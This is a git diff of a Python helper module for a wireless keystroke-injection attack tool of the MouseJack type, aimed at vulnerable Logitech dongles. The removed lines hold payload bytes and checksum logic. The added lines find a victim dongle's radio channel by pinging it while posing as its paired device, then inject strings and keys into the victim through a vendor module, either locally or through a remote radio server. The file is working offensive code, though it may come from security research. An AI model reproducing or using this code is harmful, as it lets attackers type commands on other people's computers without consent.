@@ -1,36 +1,22 @@
-import time
-from .hid_scan_codes import * # this time there is no problem doing a relative import since this file should not be executed
+"""
+This file contains utilities and functionalities common to all vendors,
+including scanning, channel sweeping and generic attack functions.
+"""
 
-SLEEPING_PERIOD = 12 / 1000 # ms
+# no problem doing relative imports since this file should not be executed
+from .hid_scan_codes import *
+from . import logitech
+
 PING_PAYLOAD = [0x0F, 0x0F, 0x0F, 0x0F]
 
-# General helping functions and static veriables
-
-def with_checksum(payload : list) -> list: 
-    """function to calculate checksum for Logitech payloads,
-    based on slide 56 of the KeyKeriki project: http://www.remote-exploit.org/content/keykeriki_v2_cansec_v1.1.pdf
-    
-    payload parameter does not include the checksum byte, it is appended to it.
+def find_frequency_channel(radio, address):
     """
-    cksum = 0xFF
-    for n in range(len(payload)):
-        cksum = (cksum - payload[n]) & 0xFF # using bitwise AND with 0xFF in order to make sure the checksum doesn't go negative (and thus exceeds 1 byte)
-    cksum = (cksum + 1) & 0xFF # if cksum is 0xFF at this point, then adding 1 will cause it to exceed 1 byte, so doing the same thing
-    payload.append(cksum)
-    return payload
-
-KEEPALIVE_PAYLOAD = with_checksum([0x00, 0x40, 0x04, 0xB0]) # the keepalive itself, includes the timeout we set before (refer to Figure 6 in the MouseJack whitepaper: Logitech Unifying Keepalive Payload)
-SET_KEEPALIVE_TIMEOUT_PAYLOAD = with_checksum([0x00, 0x4F, 0x00, 0x04, 0xB0, 0x00, 0x00, 0x00, 0x00]) # refer to Figure 5 in the MouseJack whitepaper: Logitech Unifying Set Keepalive Timeout Payload
-KEY_RELEASE_PAYLOAD = with_checksum([0x00, 0xC3, 0x00, KEY_RELEASE, 0x00, 0x00, 0x00, 0x00, 0x00])
-
-def find_address_channel(radio, address) -> int:
-    """
-    In order to communicate with the victim dongle, we must identify the frequency channel it uses to communicate with its paired device.
-    We can pretend to be that device (since we have its address), and repeatedly send an arbitrary "ping" payload to the victim dongle, using a different channel each time.
-    We do this until an ACK is received from the dongle, meaning we found the right channel.
-
-    This function iterate over channels 2 to 83 and looks for the correct channel
-    Then it sets the radio to the wished channel and returns it's int value.
+    This function receives a radio parameter (can either be a RadioServer for remote attack, or nrf24 for local attack)
+    and an RF address of a vulnerable device. It identifies the frequency channel used by the victim dongle to communicate with that device,
+    by pretending to be that device (since we have its address), and repeatedly sending an arbitrary "ping" payload to the victim dongle, using a different channel each time.
+    The function continues with this process until an ACK is received from the dongle, meaning we found the right channel.
+    It returns the channel if one was found, and None otherwise.
+    This step has to be performed before any attack, since the attacking dongle must be on the same channel as the victim dongle in order to communicate with it.
     """
 
     print('pinging...')
@@ -50,21 +36,37 @@ def find_address_channel(radio, address) -> int:
         if radio.transmit_payload(PING_PAYLOAD): # transmitting the payload; the function returns true if a response was received
             print(f'found channel: {channel}')
             return channel
-    return 0
+    return None
 
-def transmit_key(key, radio):
+def add_key_releases(keystrokes):
     """
-    Given a hid_scan_code and a radio, transmit (and rest SLEEPING_PERIOD with keepalives) the key
+    This function receives a list of keystrokes (meaning a list where each element is a list of the form: [scan_code, modifier])
+    that are about to be injected to a vulnerable dongle.
+    It tries to find consecutive pairs of keystrokes (meaning, one is to be transmitted immediately after the other) that are identical.
+    In this case, that same keystroke will not be typed twice unless a key release packet is placed between the original two.
+    So this function adds key release packets wherever necessary.
     """
-    radio.transmit_payload(with_checksum([0x00, 0xC1, 0x00, key, 0x00, 0x00, 0x00, 0x00, 0x00])) # third byte is always zero because it's the modifier mask (e.g. Ctrl, Shift, Alt...) which we don't need
-    time.sleep(SLEEPING_PERIOD) # sleeping for 12ms
-    radio.transmit_payload(KEEPALIVE_PAYLOAD) # transmitting keepalive after each keystroke
+    new_keystrokes = []
+    for i in range(len(keystrokes) - 1): # in order to not go out of range
+        new_keystrokes.append(keystrokes[i]) # copying each keystroke from the original list
+        if keystrokes[i] == keystrokes[i + 1]: # checking if the next keystroke is the same (has the same scan code and same modifier)
+            new_keystrokes.append([KEY_RELEASE, KEY_MOD_NONE]) # adding a key release 
+    new_keystrokes.append(keystrokes[-1]) # copying the last keystroke
+    return new_keystrokes
 
-def transmit_string(radio, text : str) -> bool:
+def transmit_string(radio, s, vendor=logitech):
     """
-    Iterate each letter in the text string and trasmit the right hid_scan_code using radio.
-    Return true for success and false if fails.
+    This function receives a radio parameter (can either be a RadioServer for remote attack, or nrf24 for local attack),
+    a string to be injected and the vendor of the vulnerable device. It injects the string to the victim.
     """
-    for l in text:
-        transmit_key(key=letters_dict[l], radio=radio)
-    transmit_key(KEY_RELEASE, radio)
+    keystrokes = [printable_characters[char] for char in s] # using the printable_characters dictionary from hid_scan_codes.py to get a list of keystrokes matching the characters
+    vendor.inject_keystrokes(radio, add_key_releases(keystrokes)) # calling the vendor's function to inject keystrokes, adding key release packets using the utility function if necessary
+
+def transmit_keys(radio, keys, vendor=logitech):
+    """
+    This function receives a radio parameter (can either be a RadioServer for remote attack, or nrf24 for local attack),
+    a list of keys to be injected and the vendor of the vulnerable device. It injects the keys to the victim, one by one.
+    Important note: only multimedia keys or keys that don't produce a character are allowed. For printable characters, use transmit_string().
+    """
+    keystrokes = [other_keys[name] for name in keys if name in other_keys.keys()] # using the other_keys dictionary (that's why characters are not allowed), eliminating key names that aren't in the dictionary
+    vendor.inject_keystrokes(radio, add_key_releases(keystrokes)) # calling the vendor's function to inject keystrokes, adding key release packets using the utility function if necessary
